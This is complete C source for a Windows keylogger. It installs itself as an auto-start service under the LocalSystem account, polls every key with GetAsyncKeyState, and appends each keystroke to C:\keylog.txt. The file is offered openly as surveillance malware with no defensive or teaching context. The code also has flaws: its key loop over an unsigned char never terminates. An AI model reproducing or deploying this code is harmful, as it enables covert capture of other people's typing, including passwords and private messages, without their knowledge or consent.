#include <windows.h>
#include <stdio.h>

// Service name and display name
#define SERVICE_NAME L"KeyLoggerService"
#define SERVICE_DISPLAY_NAME L"Key Logger Service"

// Global variables for service status and file logging
SERVICE_STATUS ServiceStatus = {0};
SERVICE_STATUS_HANDLE ServiceStatusHandle = NULL;
HANDLE ServiceStopEvent = INVALID_HANDLE_VALUE;
FILE *logFile = NULL;

// Function prototypes
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceControlHandler(DWORD control);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
VOID LogKeyPress(unsigned char key);

// Main function to set up and start the service
int wmain(int argc, wchar_t *argv[]) {
    // If run with "install" argument, install the service
    if (argc > 1 && _wcsicmp(argv[1], L"install") == 0) {
        SC_HANDLE schSCManager, schService;
        wchar_t szPath[MAX_PATH];

        // Get the path to the executable
        if (!GetModuleFileNameW(NULL, szPath, MAX_PATH)) {
            wprintf(L"Cannot get module file name (%d)\n", GetLastError());
            return 1;
        }

        // Open the Service Control Manager
        schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!schSCManager) {
            wprintf(L"OpenSCManager failed (%d)\n", GetLastError());
            return 1;
        }

        // Create the service
        schService = CreateServiceW(
            schSCManager,              // SCM handle
            SERVICE_NAME,              // Service name
            SERVICE_DISPLAY_NAME,      // Display name
            SERVICE_ALL_ACCESS,        // Desired access
            SERVICE_WIN32_OWN_PROCESS, // Service type
            SERVICE_AUTO_START,        // Start type (auto-start on boot)
            SERVICE_ERROR_NORMAL,      // Error control
            szPath,                    // Path to executable
            NULL,                      // No load ordering group
            NULL,                      // No tag identifier
            NULL,                      // No dependencies
            NULL,                      // LocalSystem account
            NULL);                     // No password

        if (!schService) {
            wprintf(L"CreateService failed (%d)\n", GetLastError());
            CloseServiceHandle(schSCManager);
            return 1;
        }

        wprintf(L"Service installed successfully.\n");
        CloseServiceHandle(schService);
        CloseServiceHandle(schSCManager);
        return 0;
    }

    // If run normally, start the service
    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONW)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        wprintf(L"StartServiceCtrlDispatcher failed (%d)\n", GetLastError());
        return 1;
    }

    return 0;
}

// Service entry point
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    // Register the control handler
    ServiceStatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceControlHandler);
    if (!ServiceStatusHandle) {
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    // Create a stop event
    ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (ServiceStopEvent == NULL) {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
        return;
    }

    // Open the log file
    logFile = fopen("C:\\keylog.txt", "a"); // Use a full path to ensure write access
    if (logFile == NULL) {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = ERROR_FILE_NOT_FOUND;
        SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
        return;
    }

    // Service is now running
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

    // Start the worker thread (key monitoring loop)
    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
    }

    // Cleanup when the service stops
    if (logFile) {
        fclose(logFile);
    }
    CloseHandle(ServiceStopEvent);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

// Control handler for service stop requests
VOID WINAPI ServiceControlHandler(DWORD control) {
    switch (control) {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
            SetEvent(ServiceStopEvent); // Signal the worker thread to stop
            return;
        default:
            break;
    }
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

// Worker thread for key monitoring
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    unsigned char key;

    while (WaitForSingleObject(ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x1) { // Check if key was pressed
                LogKeyPress(key);
                Sleep(100); // Debounce and reduce CPU usage
            }
        }
    }

    return 0;
}

// Log key press to file
VOID LogKeyPress(unsigned char key) {
    switch (key) {
        case VK_UP:     // 38 - Up arrow
            fprintf(logFile, "Up Arrow\n");
            break;
        case VK_DOWN:   // 40 - Down arrow
            fprintf(logFile, "Down Arrow\n");
            break;
        case VK_LEFT:   // 37 - Left arrow
            fprintf(logFile, "Left Arrow\n");
            break;
        case VK_RIGHT:  // 39 - Right arrow
            fprintf(logFile, "Right Arrow\n");
            break;
        case VK_RETURN: // 13 - Enter key
            fprintf(logFile, "Enter\n");
            break;
        case VK_SPACE:  // 32 - Spacebar
            fprintf(logFile, "Space\n");
            break;
        case VK_BACK:   // 8 - Backspace
            fprintf(logFile, "Backspace\n");
            break;
        default:
            if (key >= 32 && key <= 126) { // Printable ASCII characters
                fprintf(logFile, "Key: %c (Code: %d)\n", key, key);
            } else {
                fprintf(logFile, "Key Code: %d (Non-printable)\n", key);
            }
            break;
    }
    fflush(logFile); // Ensure data is written to file immediately
}
